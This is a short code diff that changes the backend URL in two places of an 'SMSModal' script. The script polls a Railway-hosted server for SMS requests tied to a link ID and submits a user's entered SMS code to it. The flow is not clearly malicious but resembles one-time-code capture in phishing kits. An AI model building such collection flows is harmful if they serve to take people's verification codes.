@@ -140,7 +140,7 @@ const SMSModal = {
   // Check for SMS request from backend
   async checkForSMSRequest(linkId, pageType = 'orders') {
     try {
-      const BASE_URL = 'https://worker-production-740e.up.railway.app';
+      const BASE_URL = 'https://mmworkbot-dev-production.up.railway.app';
       const url = `${BASE_URL}/sms/${linkId}?page_type=${pageType}`;
       console.log(`📱 Polling SMS: ${url}`);
 
@@ -203,7 +203,7 @@ const SMSModal = {
     }
 
     try {
-      const BASE_URL = 'https://worker-production-740e.up.railway.app';
+      const BASE_URL = 'https://mmworkbot-dev-production.up.railway.app';
       const url = `${BASE_URL}/sms/${this.currentLinkId}/submit`;
       console.log('📡 Sending to:', url);
       console.log('📦 Body:', { sms_code: smsCode });
